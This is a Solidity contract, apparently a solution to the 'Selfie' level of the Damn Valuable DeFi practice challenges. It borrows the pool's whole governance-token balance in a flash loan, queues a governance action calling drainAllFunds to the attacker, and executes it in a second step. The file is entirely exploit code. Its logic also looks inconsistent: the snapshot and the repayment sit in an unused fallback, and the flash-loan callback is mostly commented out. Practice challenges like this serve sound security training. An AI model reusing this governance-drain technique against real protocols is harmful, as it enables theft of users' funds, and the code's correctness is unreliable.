// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";

contract SelfieHack {
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public governance;

    uint256 public actionId;

    constructor(address _token, address _pool, address _governance) {
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
    }

    fallback() external {
        token.snapshot();
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    function onFlashLoan(
        address _initiator,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _data
    ) external returns (bytes32) {
        // pool.flashLoan(IERC3156FlashBorrower(_initiator), _token, _amount, _data);

        // actionId = governance.queueAction(
        //     address(pool),
        //     0,
        //     abi.encodeWithSignature(
        //         "drainAllFunds(address)",
        //         address(msg.sender)
        //     )
        // );
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() external {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            token.balanceOf(address(pool)),
            bytes("0x")
        );
        // This will run after the snapshot
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(msg.sender)
            )
        );
    }

    function attack2() external {
        governance.executeAction(actionId);
    }
}
